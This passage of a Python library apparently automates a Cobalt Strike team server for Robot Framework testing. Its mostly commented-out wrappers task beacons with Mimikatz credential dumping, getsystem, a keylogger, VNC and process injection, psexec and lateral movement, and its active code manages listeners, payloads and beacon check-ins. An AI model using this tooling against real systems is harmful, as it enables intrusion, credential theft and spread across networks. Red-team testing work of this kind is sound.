#         if not beacon: result.success = False; result.result = "Failed get Beacon obj."; return result
#         try:
#             self.debug_print(f"Issuing PowerShell: {cmd} (Beacon: {session.beacon_id})")
#             task_obj = beacon.bpowershell(cmd);
#             output = getattr(task_obj, 'output', '').strip();
#             success_flag = getattr(task_obj, 'success', None)
#             if success_flag is not None:
#                 result.success = success_flag; result.result = output if output else (
#                     "Success (no output)" if success_flag else "Failed (no output)")
#             else:
#                 result.result = output;
#                 output_lower = output.lower()
#                 result.success = not (
#                             "commandnotfoundexception" in output_lower or "is not recognized" in output_lower or "access is denied" in output_lower)
#             print(
#                 f"PowerShell result: {'Success' if result.success else 'Failure'}. Output: {result.result[:100]}{'...' if len(result.result) > 100 else ''}")
#         except Exception as e:
#             result.success = False; result.result = f"Exception: {e}"; print(f"[!] PowerShell Exception: {e}")
#         return result
#
#     def issue_bmimikatz(self, session: Session, command: str, pid: Optional[int] = None,
#                         arch: Optional[str] = None) -> CmdResult:
#         result = CmdResult();
#         beacon = self._get_beacon_for_session(session)
#         if not beacon: result.success = False; result.result = "Failed get Beacon obj."; return result
#         try:
#             self.debug_print(f"Issuing Mimikatz: {command} (Beacon: {session.beacon_id})")
#             task_obj = beacon.bmimikatz(command, pid, arch);
#             output = getattr(task_obj, 'output', '').strip()
#             success_flag = getattr(task_obj, 'success', True if output else False)  # Assume success if output
#             result.success = success_flag;
#             result.result = output if output else (
#                 "Tasked (no immediate output)" if success_flag else "Failed/No output")
#             print(f"Mimikatz result: {'Success' if result.success else 'Failure'}. Output len: {len(output)}")
#         except Exception as e:
#             result.success = False; result.result = f"Exception: {e}"; print(f"[!] Mimikatz Exception: {e}")
#         return result
#
#     def issue_bgetsystem(self, session: Session) -> CmdResult:
#         result = CmdResult();
#         beacon = self._get_beacon_for_session(session)
#         if not beacon: result.success = False; result.result = "Failed get Beacon obj."; return result
#         try:
#             self.debug_print(f"Issuing getsystem (Beacon: {session.beacon_id})")
#             task_obj = beacon.bgetsystem();
#             output = getattr(task_obj, 'output', '').strip();
#             success_flag = getattr(task_obj, 'success', None)
#             if success_flag is not None:
#                 result.success = success_flag; result.result = output if output else (
#                     "Success" if success_flag else "Failed")
#             elif output and "got system!" in output.lower():
#                 result.success = True; result.result = output
#             else:
#                 result.success = False; result.result = output if output else "Failed/No output"
#             print(f"getsystem result: {'Success' if result.success else 'Failure'}. Info: {result.result}")
#         except Exception as e:
#             result.success = False; result.result = f"Exception: {e}"; print(f"[!] getsystem Exception: {e}")
#         return result
#
#     def issue_bvnc(self, session: Session) -> CmdResult:
#         result = CmdResult();
#         beacon = self._get_beacon_for_session(session)
#         if not beacon: result.success = False; result.result = "Failed get Beacon obj."; return result
#         try:
#             self.debug_print(f"Issuing VNC (Beacon: {session.beacon_id})")
#             task_obj = beacon.bvnc();
#             output = getattr(task_obj, 'output', '').strip();
#             success_flag = getattr(task_obj, 'success', None)
#             if success_flag is not None:
#                 result.success = success_flag; result.result = output if output else (
#                     "Success" if success_flag else "Failed")
#             elif output and "tasked beacon to inject vnc server" in output.lower():
#                 result.success = True; result.result = output
#             else:
#                 result.success = False; result.result = f"Failed/Unexpected: {output}"
#             print(f"VNC result: {'Success' if result.success else 'Failure'}. Info: {result.result}")
#         except Exception as e:
#             result.success = False; result.result = f"Exception: {e}"; print(f"[!] VNC Exception: {e}")
#         return result
#
#     def issue_bkeylogger(self, session: Session) -> CmdResult:
#         result = CmdResult();
#         beacon = self._get_beacon_for_session(session)
#         if not beacon: result.success = False; result.result = "Failed get Beacon obj."; return result
#         try:
#             self.debug_print(f"Issuing keylogger (Beacon: {session.beacon_id})")
#             task_obj = beacon.bkeylogger();
#             output = getattr(task_obj, 'output', '').strip();
#             success_flag = getattr(task_obj, 'success', None)
#             if success_flag is not None:
#                 result.success = success_flag; result.result = output if output else (
#                     "Success" if success_flag else "Failed")
#             elif output and ("started keylogger" in output.lower() or "tasked beacon" in output.lower()):
#                 result.success = True; result.result = output
#             else:
#                 result.success = False; result.result = f"Failed/Unexpected: {output}" if output else "Failed (no output)"
#             print(f"Keylogger result: {'Success' if result.success else 'Failure'}. Info: {result.result}")
#         except Exception as e:
#             result.success = False; result.result = f"Exception: {e}"; print(f"[!] Keylogger Exception: {e}")
#         return result
#
#     def issue_bpsexec(self, session: Session, target: str, listener: str, location: str = "ADMIN$",
#                       arch: str = "x64") -> CmdResult:
#         result = CmdResult();
#         beacon = self._get_beacon_for_session(session)
#         if not beacon: result.success = False; result.result = "Failed get Beacon obj."; return result
#         try:
#             self.debug_print(f"Issuing psexec: {target} via {listener} (Beacon: {session.beacon_id})")
#             task_obj = beacon.bpsexec(target=target, listener=listener, share=location, arch=arch);
#             output = getattr(task_obj, 'output', '').strip();
#             success_flag = getattr(task_obj, 'success', None)
#             if success_flag is not None:
#                 result.success = success_flag; result.result = output if output else (
#                     "Success" if success_flag else "Failed")
#             else:
#                 result.result = output;
#                 error_indicators = ["could not upload file", "error_bad_net_name", "access is denied",
#                                     "failed to start service", "system error", "network path was not found"]
#                 output_lower = output.lower();
#                 found_error = any(error in output_lower for error in error_indicators)
#                 if found_error:
#                     result.success = False
#                 elif "started service" in output_lower or "tasked beacon" in output_lower:
#                     result.success = True
#                 else:
#                     result.success = False  # Unclear
#             print(
#                 f"psexec result: {'Success' if result.success else 'Failure'}. Info: {result.result[:100]}{'...' if len(result.result) > 100 else ''}")
#         except Exception as e:
#             result.success = False; result.result = f"Exception: {e}"; print(f"[!] psexec Exception: {e}")
#         return result
#
#     def issue_binject(self, session: Session, pid: int, listener: str, arch: str = "x64") -> CmdResult:
#         result = CmdResult();
#         beacon = self._get_beacon_for_session(session)
#         if not beacon: result.success = False; result.result = "Failed get Beacon obj."; return result
#         try:
#             self.debug_print(f"Issuing inject: PID {pid} via {listener} (Beacon: {session.beacon_id})")
#             task_obj = beacon.binject(pid=pid, listener=listener, arch=arch);
#             output = getattr(task_obj, 'output', '').strip();
#             success_flag = getattr(task_obj, 'success', None)
#             if success_flag is not None:
#                 result.success = success_flag; result.result = output if output else (
#                     "Success" if success_flag else "Failed")
#             else:
#                 result.result = output;
#                 error_indicators = ["failed", "could not inject", "invalid pid", "access denied", "error"]
#                 output_lower = output.lower();
#                 found_error = any(err in output_lower for err in error_indicators)
#                 if found_error:
#                     result.success = False
#                 elif "tasked beacon to inject" in output_lower:
#                     result.success = True
#                 else:
#                     result.success = False  # Unclear
#             print(
#                 f"Inject result: {'Success' if result.success else 'Failure'}. Info: {result.result[:100]}{'...' if len(result.result) > 100 else ''}")
#         except Exception as e:
#             result.success = False; result.result = f"Exception: {e}"; print(f"[!] inject Exception: {e}")
#         return result
#
#     def issue_lateral_move(self, session: Session, target_ip: str, method: str, listener: str) -> CmdResult:
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False
#             result.result = "Failed to get Beacon object for originating session."
#             return result
#
#         try:
#             self.debug_print(
#                 f"Issuing lateral movement ({method}) from Beacon {session.beacon_id} to {target_ip} via {listener}")
#
#             # bjump has no output so all we care about is if the teamserver
#             # successfully tasked the bjump command
#             task_obj = beacon.bjump(method=method, target_ip=target_ip, listener=listener)
#
#             # #Modify this to wait for beacon check-in
#             # if not task_obj.success:
#             #     result.success = False
#             #     result.result = f"Failed to task bjump command: {task_obj.output}"
#             #     print(f"Lateral move command failed to task. Success: {result.success}")
#             #     return result #Early return if bjump tasking failed
#
#             # Use wait_for_beacon_checkin_with_ip to confirm new beacon with target_ip
#             try:
#                 # Wait for the new beacon with the target's IP to checkin. Timeout after 60s
#                 # new_beacon_id = self.wait_for_beacon_checkin_with_ip(original_ip = target_ip, listener_name = listener, timeout="60s")
#
#                 result.success = True
#                 # result.result = f"Lateral movement successful. New beacon ID: {new_beacon_id}"
#                 result.result = f"Lateral movement successful."
#                 # print(f"Lateral move command tasked. Success: {result.success}. New beacon found with ID {new_beacon_id}.")
#             except Exception as e:
#                 result.success = False
#                 result.result = f"Exception while waiting for beacon check-in: {type(e).__name__}: {e}"
#                 print(f"Lateral move failed: {result.result}")
#
#         except Exception as e:
#             result.success = False
#             result.result = f"Exception during bjump: {type(e).__name__}: {e}"
#             print(f"[!] Lateral Move Exception: {type(e).__name__}: {e}")
#
#         return result
#
#     def issue_bsleep(self, session: Session, sleep_time: int, jitter: Optional[int] = 0) -> CmdResult:
#         """
#          Function to put beacon to sleep
#          :param session: active session
#          :param sleep_time: sleep time in seconds
#          :param jitter: a jitter value (0-99) to force Beacon to randomly modify its sleep time
#          :return:
#          """
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False
#             result.result = "Failed to get Beacon object for session."
#             print(f"[!] Error: {result.result}")
#             return result
#
#         beacon_id = session.beacon_id
#         print(f"Issuing sleep command to Beacon {beacon_id}: Sleep time {sleep_time} seconds, with {jitter}% jitter")
#         aggressor_cmd = f"bsleep({beacon_id}, {sleep_time}, {jitter});"
#
#         print(f"[*] Attempting to run on Beacon {beacon_id}:")
#         # print(f"[*] Connecting as: {connector_user}")
#         print(f"[*] Aggressor Cmd: {aggressor_cmd}")
#
#         with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_send_cd", cs_pass=self.CS_PASSWORD,
#                          cs_port=self.PORT, cs_directory=self.CS_DIR) as cs:
#             print(f"[*] Sending bsleep request...")
#             #cs.ag_sendline(f"bclear({beacon_id})")
#             cs.ag_sendline(aggressor_cmd)
#
#             output_catcher = f"on beacon_output{{ if ($1 eq '{beacon_id}') {{ println($2); }} }}"
#
#             cs.ag_sendline(output_catcher)
#             # cs.cs_process.expect(expect_pattern, timeout=None)
#
#             print(f"[*] Output received. Before...")
#             print(cs.cs_process.before.decode())
#
#             print(f"[*] Output received. After...")
#             print(cs.cs_process.after.decode())
#
#             processed_output = cs.cs_process.after.decode()
#
#             result.success = True
#             result.result = f"Put beacon to sleep."
#
#         return result
#
#     def issue_bexit(self, session: Session) -> CmdResult:
#         """
#         Function to ask beacon to exit
#         :param session: active session
#         :return:
#         """
#
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False
#             result.result = "Failed to get Beacon object for session."
#             print(f"[!] Error: {result.result}")
#             return result
#
#         beacon_id = session.beacon_id
#         print(f"Issuing exit command to Beacon {beacon_id}")
#         aggressor_cmd = f"bexit({beacon_id});"
#
#         print(f"[*] Attempting to run on Beacon {beacon_id}:")
#         # print(f"[*] Connecting as: {connector_user}")
#         print(f"[*] Aggressor Cmd: {aggressor_cmd}")
#
#         with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_send_cd", cs_pass=self.CS_PASSWORD,
#                          cs_port=self.PORT, cs_directory=self.CS_DIR) as cs:
#             print(f"[*] Sending directory change request...")
#             #cs.ag_sendline(f"bclear({beacon_id})")
#             cs.ag_sendline(aggressor_cmd)
#
#             output_catcher = f"on beacon_output{{ if ($1 eq '{beacon_id}') {{ println($2); }} }}"
#
#             cs.ag_sendline(output_catcher)
#             # cs.cs_process.expect(expect_pattern, timeout=None)
#
#             print(f"[*] Output received. Before...")
#             print(cs.cs_process.before.decode())
#
#             print(f"[*] Output received. After...")
#             print(cs.cs_process.after.decode())
#
#             processed_output = cs.cs_process.after.decode()
#
#             result.success = True
#             result.result = f"Tasked beacon to exit."
#
#         return result
#
#     def get_beacon_list(self) -> list:
#         """
#         Get a list of available active beacon
#         :return:
#         """
#
#         ret_list = []
#         c2 = CobaltStrikeC2()
#         c2._configure_and_validate()
#
#         print("WAIT: Attempting to get initial beacon list...")
#         with CSConnector(cs_host=c2.TEAMSERVER_HOST, cs_user=f"{c2.USER}_wait_initial", cs_pass=c2.CS_PASSWORD,
#                          cs_port=c2.PORT, cs_directory=c2.CS_DIR) as cs:
#             # get_beacons returns JavaList, iterate through it
#             raw_initial_beacons = cs.get_beacons()  # This is the JavaList
#             if raw_initial_beacons:  # Check if it's not None or empty
#                 for beacon_info in raw_initial_beacons:
#                     # Access 'id' key, assuming each item behaves like a dict
#                     ret_list.append(beacon_info)
#
#         return ret_list
#
#     def get_beacon_info_by_id(self, beacon_id: str) -> dict:
#         """
#         Get beacon info by beacon id
#         :param beacon_id: beacon id to lookup
#         :return: dict of beacon info
#         # Beacon Information Dictionary
#         # {'note': '', 'charset': 'windows-1252', 'internal': '172.48.3.2', 'alive': 'true', 'session': 'beacon',
#         # 'listener': 'HTTP_Listener', 'pid': '7892', 'lastf': '15s', 'sleep': [60, 0, 1], 'computer': 'DALLAS-USER5-0',
#         # 'host': '172.48.3.2', 'is64': '1', 'id': '1032878350', 'process': 'HTTP_Listener.x64.exe', 'ver': '6.2',
#         # 'last': '15754', 'os': 'Windows', 'barch': 'x64', 'phint': '0', 'external': '70.39.165.194', 'port': '0',
#         # 'build': 9200, 'pbid': '', 'arch': 'x64', 'user': 'test *', 'impersonated': '', '_accent': ''}
#         """
#         ret_val = {}
#         c2 = CobaltStrikeC2()
#         c2._configure_and_validate()
#
#         beacon_list = c2.get_beacon_list()
#
#         for beacon_info in beacon_list:
#             # Access 'id' key, assuming each item behaves like a dict
#             try:
#                 bid = str(beacon_info['id']).strip()
#                 if bid == beacon_id:
#                     ret_val = beacon_info
#                     break
#             except (KeyError, TypeError) as e:
#                 print(f"WAIT WARNING: Error accessing 'id' in initial beacon info: {beacon_info}. Error: {e}")
#         return ret_val
#
#
class C2Keywords:
    """Robot Framework keyword library for interacting with Cobalt Strike."""
    ROBOT_LIBRARY_SCOPE = 'GLOBAL'  # One instance per suite execution

    def __init__(self):
        """Initializes the keyword library instance."""
        self.c2: Optional[cobaltstrike] = None
        self.active_session: Optional[Session] = None
        self.data_dir: Path = Path("./rf_data").resolve()  # Default data dir for RF runs
        print("C2Keywords initialized.")

    # --- Setup & Teardown Keywords ---

    def setup_c2_environment(self, ip: str, user: str, password: str, cs_dir: str, port: int = 50050,
                             sudo_required: bool = True, data_dir: str = "./rf_data", debug: bool = False,
                             sudo_password: str = "password"):
        """
        Initializes connection, sudo, starts C2 server. Call in Suite Setup.

        Args:
          ip (str): IP address for team server binding & connection.
          user (str): Cobalt Strike username.
          password (str): Cobalt Strike password.
          cs_dir (str): Path to Cobalt Strike installation directory.
          port (int): Port for the team server. Defaults to 50050.
          sudo_required (bool): If True, attempts to set sudo context via sudopass. Defaults to True.
          data_dir (str): Directory to store payloads/artifacts. Defaults to './rf_data'.
          debug (bool): Enable debug logging. Defaults to False.
        """
        print(
            f"Setting up C2 Environment: IP={ip}, User={user}, Dir={cs_dir}, Port={port}, Sudo={sudo_required}, Data={data_dir}, Debug={debug}")
        self.data_dir = Path(data_dir).resolve()
        self.data_dir.mkdir(parents=True, exist_ok=True)
        print(f"Artifact directory set to: {self.data_dir}")

        if sudo_required:
            try:
                sp = sudopass.SudoPass()
                if sudo_password:
                    sp.set_sudo(kill_on_error=False, verify_password=False,
                                password=password)  # Adjust verify_password as needed
                    print("Sudo password context set via sudopass.")
                else:
                    sp.set_sudo(verify_password=False)

            except NameError:
                raise RuntimeError("sudopass library not found or imported.")
            except Exception as sudo_e:
                raise RuntimeError(f"Error initializing or setting sudopass: {sudo_e}")

        try:
            # Resolve cs_dir path before passing
            resolved_cs_dir = str(Path(cs_dir).resolve())
            self.c2 = cobaltstrike(
                local_bind_ip=ip, user=user, cs_password=password,
                cs_dir=resolved_cs_dir, port=port, debug=debug
            )
            if not self.c2.start_C2():
                raise RuntimeError("Failed to start Cobalt Strike Team Server. Check logs.")
            print("Cobalt Strike C2 Environment Setup Successful.")
        except Exception as e:
            self.c2 = None
            raise RuntimeError(f"Failed during C2 setup: {type(e).__name__}: {e}")  # Include exception type

    def teardown_c2_environment(self):
        """
        Cleans up listeners, payloads, and stops C2 server. Call in Suite Teardown.
        """
        print("\nTearing down C2 Environment...")
        if not self.c2:
            print("C2 instance not found, skipping teardown.")
            return

        payloads_to_delete = list(getattr(self.c2, 'payloads', []))
        listeners_to_delete = list(getattr(self.c2, 'listeners', []))
        sessions_to_kill = list(getattr(self.c2, 'sessions', []))

        print(f"Attempting to kill {len(sessions_to_kill)} tracked sessions...")
        for session in sessions_to_kill:
            self.c2.kill_session(session)  # Ignore result, best effort
            self.kill_beacon()

        print(f"Attempting to delete {len(listeners_to_delete)} tracked listeners...")
        for listener_name in listeners_to_delete:
            self.c2.delete_listener(listener_name)

        print(f"\nAttempting to delete {len(payloads_to_delete)} tracked payload files...")
        for payload_path_str in payloads_to_delete:
            self.c2.delete_payload(Path(payload_path_str))

        print(f"\nCleaning extra files in {self.data_dir}...")
        try:
            for item in self.data_dir.glob("*"):
                if item.is_file():
                    print(f"Deleting extra file: {item}")
                    try:
                        os.remove(item)
                    except OSError as e:
                        print(f"  Error deleting {item}: {e}")
        except Exception as glob_e:
            print(f"Error cleaning data directory: {glob_e}")

        print(f'\nStopping C2 Team Server...')
        time.sleep(2)
        if not self.c2.stop_c2():
            print("Warning: Stop Team Server command reported failure during teardown.")
        else:
            print("Team Server stopped successfully.")
        print("C2 Environment Teardown Complete.")
#
#     # --- Helper & Action Keywords ---
#
#     def _ensure_ready(self) -> CobaltStrikeC2:
#         if not self.c2: raise RuntimeError("C2 environment not set up.")
#         return self.c2
#
#     def _ensure_active_session(self) -> Session:
#         c2 = self._ensure_ready()
#         if not self.active_session or self.active_session.beacon_id is None: raise RuntimeError(
#             "No active beacon session set.")
#         return self.active_session
#
#     def set_active_beacon(self, beacon_id: str):
#         c2 = self._ensure_ready()
#         if not beacon_id: raise ValueError("Beacon ID cannot be empty.")
#         print(f"Setting active session for Beacon ID: {beacon_id}")
#         existing_session = next((s for s in getattr(c2, 'sessions', []) if s.beacon_id == str(beacon_id)), None)
#         if existing_session:
#             self.active_session = existing_session; print("Found existing session.")
#         else:
#             self.active_session = Session(); self.active_session.beacon_id = str(beacon_id); c2.add_session(
#                 self.active_session); print("Created new session.")
#         print(f"Active session set to Beacon {beacon_id}.")
#
#     def create_cs_listener(self, name: str, type_name: str, options_str: str):
#         c2 = self._ensure_ready()
#         try:
#             listener_type = Listener[type_name]  # Use exact name
#         except KeyError:
#             raise ValueError(f"Invalid listener type '{type_name}'. Valid: {[e.name for e in Listener]}")
#         options_dict = None
#         if options_str:
#             options_dict = {}
#             try:
#                 for item in options_str.split(';'):
#                     item = item.strip();
#                     if not item: continue
#                     if '=' in item:
#                         key, value = item.split('=', 1); options_dict[key.strip()] = value.strip()
#                     else:
#                         print(f"Warning: Ignoring malformed option part '{item}'")
#             except Exception as e:
#                 raise ValueError(f"Failed to parse options string '{options_str}': {e}")
#         if not c2.create_listener(name, listener_type, options_dict): raise RuntimeError(
#             f"Failed to create listener '{name}'.")
#         print(f"Keyword: Listener '{name}' created.")
#
#     def delete_cs_listener(self, name: str) -> bool:
#         c2 = self._ensure_ready()
#
#         return c2.delete_listener(name)
#
#     def create_cs_payload(self, types: str = 'exe', listener: str = 'all', architectures: str = 'both',
#                           output_dir: Optional[str] = None):
#         c2 = self._ensure_ready()
#         target_path = Path(output_dir).resolve() if output_dir else self.data_dir
#         print(f"Generating payloads: Types={types}, Listener={listener}, Arch={architectures}, Output={target_path}")
#         c2.create_payload(cs_types=types, cs_listener=listener, cs_architectures=architectures,
#                           payload_path=target_path)
#
#     def update_cs_payload_location(self, source_filename: str, destination_dir: str, source_dir: Optional[str] = None):
#         c2 = self._ensure_ready()
#         src_dir_path = Path(source_dir).resolve() if source_dir else self.data_dir
#         dest_dir_path = Path(destination_dir).resolve()
#         src_file_path = src_dir_path / source_filename
#         dest_file_path = dest_dir_path / source_filename
#         print(f"Updating payload location: '{src_file_path}' -> '{dest_file_path.parent}'")
#         if not src_file_path.is_file(): raise FileNotFoundError(f"Source payload '{src_file_path}' not found.")
#         if not c2.update_payload(src_file_path, dest_file_path): raise RuntimeError(
#             f"Failed to move/update payload '{src_file_path}'.")
#         print("Payload location updated.")
#
#     # ==========================================================================
#     # ============ START OF wait_for_beacon_checkin (Corrected Version) =======
#     # ==========================================================================
#     def wait_for_beacon_checkin(self, listener_name: Optional[str] = None, timeout: str = "120s") -> str:
#         """
#         Waits for a new beacon to check in, optionally filtering by listener.
#         Handles JavaList return type from cs.get_beacons().
#         """
#         c2 = self._ensure_ready()
#         timeout_seconds = self._parse_robot_time(timeout)
#         print(f"WAIT: Waiting up to {timeout_seconds}s for beacon check-in" + (
#             f" for listener '{listener_name}'" if listener_name else ""))
#
#         # Store initial beacon IDs as a set of strings
#         initial_beacon_ids_set: set[str] = set()
#         try:
#             print("WAIT: Attempting to get initial beacon list...")
#             with CSConnector(cs_host=c2.TEAMSERVER_HOST, cs_user=f"{c2.USER}_wait_initial", cs_pass=c2.CS_PASSWORD,
#                              cs_port=c2.PORT, cs_directory=c2.CS_DIR) as cs:
#                 # get_beacons returns JavaList, iterate through it
#                 raw_initial_beacons = cs.get_beacons()  # This is the JavaList
#                 if raw_initial_beacons:  # Check if it's not None or empty
#                     for beacon_info in raw_initial_beacons:
#                         # Access 'id' key, assuming each item behaves like a dict
#                         try:
#                             bid = str(beacon_info['id']).strip()  # Get ID, convert to string, strip whitespace
#                             initial_beacon_ids_set.add(bid)
#                         except (KeyError, TypeError) as e:
#                             print(
#                                 f"WAIT WARNING: Error accessing 'id' in initial beacon info: {beacon_info}. Error: {e}")
#                 print(
#                     f"WAIT: Initial beacon count: {len(initial_beacon_ids_set)}. IDs: {sorted(list(initial_beacon_ids_set))}")
#         except Exception as e:
#             # Catch potential issues during initial fetch, including AttributeErrors if assumptions are wrong
#             print(f"WAIT WARNING: Could not get or process initial beacon list: {type(e).__name__}: {e}")
#
#         start_time = time.time()
#         iteration = 0
#         print(f"WAIT: Starting polling loop at {time.strftime('%H:%M:%S')}")
#
#         while time.time() - start_time < timeout_seconds:
#             iteration += 1
#             print(f"\nWAITLOOP {iteration}: Entering loop iteration at {time.strftime('%H:%M:%S')}")
#
#             current_beacons_list = None  # Initialize for this iteration
#             connection_error = None
#
#             try:
#                 connector_user = f"{c2.USER}_wait_check_{int(time.time())}_{iteration}"
#                 print(f"WAITLOOP {iteration}: Attempting connection with user {connector_user}...")
#                 with CSConnector(cs_host=c2.TEAMSERVER_HOST, cs_user=connector_user, cs_pass=c2.CS_PASSWORD,
#                                  cs_port=c2.PORT, cs_directory=c2.CS_DIR) as cs:
#                     print(f"WAITLOOP {iteration}: Connected. Attempting cs.get_beacons()...")
#                     current_beacons_list = cs.get_beacons()  # Should be JavaList or None
#                     print(f"WAITLOOP {iteration}: cs.get_beacons() completed (Type: {type(current_beacons_list)}).")
#
#                     if current_beacons_list is None:
#                         print(f"WAITLOOP {iteration}: No beacons currently reported by get_beacons().")
#                         current_beacons_list = []  # Treat None as empty list for iteration
#
#             except Exception as e:
#                 connection_error = e
#                 print(f"WAITLOOP {iteration}: ERROR during CS connection/get_beacons: {type(e).__name__}: {e}")
#
#             # --- Process results ONLY if connection and get_beacons succeeded ---
#             if connection_error is None:
#                 found_match = False  # Flag to break inner loop once match found
#                 processed_ids_this_iter = []  # Track IDs processed in this poll
#
#                 try:
#                     for beacon_info in current_beacons_list:  # Iterate through the JavaList
#                         processed_ids_this_iter.append(str(beacon_info.get('id', 'ERROR')))  # Log what we see
#                         try:
#                             bid = str(beacon_info['id']).strip()  # Access 'id', convert, strip
#                         except (KeyError, TypeError) as e:
#                             print(
#                                 f"WAITLOOP {iteration}: ERROR accessing 'id' in current beacon info: {beacon_info}. Skipping. Error: {e}")
#                             continue  # Skip this beacon if ID cannot be accessed
#
#                         # THE CRITICAL CHECK: Is the current ID not in the initial set?
#                         if bid not in initial_beacon_ids_set:
#                             beacon_listener = beacon_info.get('listener', 'Unknown')  # Access 'listener'
#                             print(
#                                 f"WAITLOOP {iteration}:  -> NEW Beacon Detected! ID='{bid}', Listener='{beacon_listener}'")
#
#                             # Check listener filter
#                             if listener_name is None or beacon_listener.lower() == listener_name.lower():
#                                 print(f"WAITLOOP {iteration}:  -> MATCH FOUND! Returning beacon ID: '{bid}'")
#                                 return bid  # Success!
#                             else:
#                                 print(
#                                     f"WAITLOOP {iteration}:  -> New beacon '{bid}' ignored (Filter mismatch: needed '{listener_name}')")
#                                 # Add ignored one to initial set to prevent re-detection in THIS keyword execution
#                                 initial_beacon_ids_set.add(bid)
#                         # else: # Optional debug
#                         # if iteration % 10 == 1 : print(f"WAITLOOP {iteration}:  -> Existing beacon ID '{bid}'.")
#
#                     if iteration % 6 == 1:  # Log periodically which IDs were processed
#                         print(
#                             f"WAITLOOP {iteration}: Finished processing current poll. IDs seen: {sorted(processed_ids_this_iter)}")
#
#
#                 except AttributeError as list_iter_err:
#                     # Catch error if current_beacons_list doesn't support iteration
#                     print(
#                         f"WAITLOOP {iteration}: ERROR iterating through get_beacons result: {type(list_iter_err).__name__}: {list_iter_err}. Result was: {current_beacons_list}")
#                 except Exception as proc_err:
#                     # Catch other unexpected errors during processing
#                     print(f"WAITLOOP {iteration}: ERROR processing beacon list: {type(proc_err).__name__}: {proc_err}")
#
#             else:
#                 print(f"WAITLOOP {iteration}: Skipping comparison due to connection/get_beacons error.")
#
#             print(f"WAITLOOP {iteration}: Iteration complete. Sleeping 5s...")
#             time.sleep(5)  # Check interval
#
#         # If loop finishes, timeout occurred
#         print(f"WAIT: Loop finished after {time.time() - start_time:.1f} seconds.")  # Log loop end time
#         raise RuntimeError(f"Timeout: No new matching beacon checked in within {timeout_seconds} seconds.")
#
#     def wait_for_beacon_checkin_with_specific_ip(self, specific_ip: str, listener_name: Optional[str] = None,
#                                                  timeout: str = "120s") -> str:
#         """
#         Waits for a beacon with a SPECIFIC IP to check in, optionally filtering by listener.
#         Handles JavaList return type from cs.get_beacons().
#         """
#         c2 = self._ensure_ready()
#         timeout_seconds = self._parse_robot_time(timeout)
#         print(f"WAIT: Waiting up to {timeout_seconds}s for beacon check-in with DIFFERENT IP (NOT {specific_ip})" + (
#             f" for listener '{listener_name}'" if listener_name else ""))
#
#         # Store initial beacon IDs as a set of strings
#         initial_beacon_ids_set: set[str] = set()
#         try:
#             print("WAIT: Attempting to get initial beacon list...")
#             with CSConnector(cs_host=c2.TEAMSERVER_HOST, cs_user=f"{c2.USER}_wait_initial", cs_pass=c2.CS_PASSWORD,
#                              cs_port=c2.PORT, cs_directory=c2.CS_DIR) as cs:
#                 # get_beacons returns JavaList, iterate through it
#                 raw_initial_beacons = cs.get_beacons()  # This is the JavaList
#                 if raw_initial_beacons:  # Check if it's not None or empty
#                     for beacon_info in raw_initial_beacons:
#                         # Access 'id' key, assuming each item behaves like a dict
#                         try:
#                             bid = str(beacon_info['id']).strip()  # Get ID, convert to string, strip whitespace
#                             try:
#                                 print(" Beacon IP is ", str(beacon_info['external']).strip())
#                             finally:
#                                 pass
#                             bip = beacon_info.get('external', 'UNKNOWN')  # Get IP, Default to 'UNKNOWN'
#                             print("\nBeacon ID = ", bid, "\nBeacon IP = ", bip, "\n")
#                             if bip == specific_ip:
#                                 return bid
#                             initial_beacon_ids_set.add(bid)
#                         except (KeyError, TypeError) as e:
#                             print(
#                                 f"WAIT WARNING: Error accessing 'id' in initial beacon info: {beacon_info}. Error: {e}")
#                 print(
#                     f"WAIT: Initial beacon count: {len(initial_beacon_ids_set)}. IDs: {sorted(list(initial_beacon_ids_set))}")
#         except Exception as e:
#             # Catch potential issues during initial fetch, including AttributeErrors if assumptions are wrong
#             print(f"WAIT WARNING: Could not get or process initial beacon list: {type(e).__name__}: {e}")
#
#         start_time = time.time()
#         iteration = 0
#         print(f"WAIT: Starting polling loop at {time.strftime('%H:%M:%S')}")
#
#         while time.time() - start_time < timeout_seconds:
#             iteration += 1
#             print(f"\nWAITLOOP {iteration}: Entering loop iteration at {time.strftime('%H:%M:%S')}")
#
#             current_beacons_list = None  # Initialize for this iteration
#             connection_error = None
#
#             try:
#                 connector_user = f"{c2.USER}_wait_check_{int(time.time())}_{iteration}"
#                 print(f"WAITLOOP {iteration}: Attempting connection with user {connector_user}...")
#                 with CSConnector(cs_host=c2.TEAMSERVER_HOST, cs_user=connector_user, cs_pass=c2.CS_PASSWORD,
#                                  cs_port=c2.PORT, cs_directory=c2.CS_DIR) as cs:
#                     print(f"WAITLOOP {iteration}: Connected. Attempting cs.get_beacons()...")
#                     current_beacons_list = cs.get_beacons()  # Should be JavaList or None
#                     print(f"WAITLOOP {iteration}: cs.get_beacons() completed (Type: {type(current_beacons_list)}).")
#
#                     if current_beacons_list is None:
#                         print(f"WAITLOOP {iteration}: No beacons currently reported by get_beacons().")
#                         current_beacons_list = []  # Treat None as empty list for iteration
#
#             except Exception as e:
#                 connection_error = e
#                 print(f"WAITLOOP {iteration}: ERROR during CS connection/get_beacons: {type(e).__name__}: {e}")
#
#             # --- Process results ONLY if connection and get_beacons succeeded ---
#             if connection_error is None:
#                 found_match = False  # Flag to break inner loop once match found
#                 processed_ids_this_iter = []  # Track IDs processed in this poll
#
#                 try:
#                     for beacon_info in current_beacons_list:  # Iterate through the JavaList
#                         processed_ids_this_iter.append(str(beacon_info.get('id', 'ERROR')))  # Log what we see
#                         try:
#                             bid = str(beacon_info['id']).strip()  # Access 'id', convert, strip
#                             bip = beacon_info.get('ip', 'UNKNOWN')  # Get IP, Default to 'UNKNOWN'
#                         except (KeyError, TypeError) as e:
#                             print(
#                                 f"WAITLOOP {iteration}: ERROR accessing 'id' or 'ip' in current beacon info: {beacon_info}. Skipping. Error: {e}")
#                             continue  # Skip this beacon if ID or IP cannot be accessed
#
#                         # THE CRITICAL CHECK: Is the current ID NOT in the initial set AND does it have a DIFFERENT IP?
#                         if bid not in initial_beacon_ids_set and bip != specific_ip:
#                             beacon_listener = beacon_info.get('listener', 'Unknown')
#                             print(
